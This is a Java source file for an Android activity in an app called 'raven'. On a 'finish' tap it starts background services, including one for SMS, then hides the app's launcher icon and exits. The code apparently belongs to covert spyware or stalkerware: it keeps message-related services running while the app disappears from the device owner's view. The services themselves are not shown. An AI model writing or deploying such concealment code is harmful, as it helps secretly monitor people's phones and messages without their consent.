package com.ola.raven.RegComplete;

import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;

import com.ola.raven.Broadcast.SmsReceiver;
import com.ola.raven.R;
import com.ola.raven.Service.AllServices;
import com.ola.raven.Service.SmsService;

public class RegComplete extends AppCompatActivity {

    private Button finish;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_reg_complete);

        finish = (Button) findViewById(R.id.finish);
        finish.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startService();
                startService(new Intent(getBaseContext(), SmsService.class));
                hideIcon();
                System.exit(0);
            }
        });
    }

    private void startService(){
        startService(new Intent(getBaseContext(), AllServices.class));
    }

    public void hideIcon(){
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this,com.ola.raven.MainActivity.class);
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED,PackageManager.DONT_KILL_APP);
    }

    public void showIcon(){
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this,com.ola.raven.MainActivity.class);
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_ENABLED,PackageManager.DONT_KILL_APP);
    }
}
